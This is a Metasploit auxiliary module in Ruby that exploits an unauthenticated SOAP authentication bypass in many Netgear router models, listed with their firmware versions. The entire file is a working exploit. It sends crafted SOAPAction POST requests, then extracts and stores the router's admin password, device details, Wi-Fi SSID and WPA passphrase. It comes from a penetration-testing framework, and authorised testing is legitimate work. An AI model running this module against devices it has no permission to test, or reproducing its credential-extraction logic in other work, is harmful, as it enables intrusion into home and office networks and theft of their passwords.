##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Netgear Unauthenticated SOAP Password Extractor',
      'Description' => %q{
        This module exploits an authentication bypass vulnerability in different Netgear devices.
        It allows to extract the password for the remote management interface. This module has been
        tested on a Netgear WNDR3700v4 - V1.0.1.42, but other devices are reported as vulnerable:
        NetGear WNDR3700v4 - V1.0.0.4SH, NetGear WNDR3700v4 - V1.0.1.52, NetGear WNR2200 - V1.0.1.88,
        NetGear WNR2500 - V1.0.0.24, NetGear WNDR3700v2 - V1.0.1.14 (Tested by Paula Thomas),
        NetGear WNDR3700v1 - V1.0.16.98 (Tested by Michal Bartoszkiewicz),
        NetGear WNDR3700v1 - V1.0.7.98 (Tested by Michal Bartoszkiewicz),
        NetGear WNDR4300 - V1.0.1.60 (Tested by Ronny Lindner),
        NetGear R6300v2 - V1.0.3.8 (Tested by Robert Mueller),
        NetGear WNDR3300 - V1.0.45 (Tested by Robert Mueller),
        NetGear WNDR3800 - V1.0.0.48 (Tested by an Anonymous contributor),
        NetGear WNR1000v2 - V1.0.1.1 (Tested by Jimi Sebree),
        NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton),
        NetGear WNR2000v3 - v1.1.2.10 (Tested by h00die)
      },
      'References'  =>
        [
          [ 'BID', '72640' ],
          [ 'OSVDB', '118316' ],
          [ 'URL', 'https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR' ]
        ],
      'Author'      =>
        [
          'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery
          'Michael Messner <devnull[at]s3cur1ty.de>',	     # Metasploit module
          'h00die <mike@shorebreaksecurity.com>'       # Metasploit enhancements/docs
        ],
      'License'     => MSF_LICENSE,
      'DisclosureDate' => 'Feb 11 2015'
    )
  end

  def run
    print_status("Trying to access the configuration of the device")

    # extract device details
    action = 'urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo'
    print_status("Extracting Firmware version...")
    extract_data(action)

    # extract credentials
    action = 'urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo'
    print_status("Extracting credentials...")
    extract_data(action)

    # extract wifi info
    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo'
    print_status("Extracting Wifi...")
    extract_data(action)

    # extract WPA info
    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys'
    print_status("Extracting WPA Keys...")
    extract_data(action)
  end

  def extract_data(soap_action)
    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => '/',
        'headers' => {
          'SOAPAction' => soap_action,
        },
        'data'    => '='
      })

      return if res.nil?
      return if res.code == 404
      return if res.headers['Server'].nil?
      # unknown if other devices have other Server headers
      return if res.headers['Server'] !~ /Linux\/2.6.15 uhttpd\/1.0.0 soap\/1.0/

      if res.body =~ /<NewPassword>(.*)<\/NewPassword>/
        print_status("Credentials found, extracting...")
        extract_credentials(res.body)
      end

      if res.body =~ /<ModelName>(.*)<\/ModelName>/
        model_name = $1
        print_good("Model #{model_name} found")
      end

      if res.body =~ /<Firmwareversion>(.*)<\/Firmwareversion>/
        firmware_version = $1
        print_good("Firmware version #{firmware_version} found")

        #store all details as loot
        loot = store_loot('netgear_soap_device.config', 'text/plain', rhost, res.body)
        print_good("Device details downloaded to: #{loot}")
      end

      if res.body =~ /<NewSSID>(.*)<\/NewSSID>/
        ssid = $1
        print_good("Wifi SSID: #{ssid}")
      end

      if res.body =~ /<NewBasicEncryptionModes>(.*)<\/NewBasicEncryptionModes>/
        wifi_encryption = $1
        print_good("Wifi Encryption: #{wifi_encryption}")
      end

      if res.body =~ /<NewWPAPassphrase>(.*)<\/NewWPAPassphrase>/
        wifi_password = $1
        print_good("Wifi Password: #{wifi_password}")
      end

    rescue ::Rex::ConnectionError
      vprint_error("Failed to connect to the web server")
      return
    end
  end

  def extract_credentials(body)
    body.each_line do |line|
      if line =~ /<NewPassword>(.*)<\/NewPassword>/
        pass = $1
        print_good("admin / #{pass} credentials found")

        connection_details = {
          module_fullname: self.fullname,
          private_data: pass,
          private_type: :password,
          username: 'admin',
          status: Metasploit::Model::Login::Status::UNTRIED
        }.merge(service_details)
        create_credential_and_login(connection_details)
      end
    end

    # store all details as loot
    loot = store_loot('netgear_soap_account.config', 'text/plain', rhost, body)
    print_good("Account details downloaded to: #{loot}")
  end
end
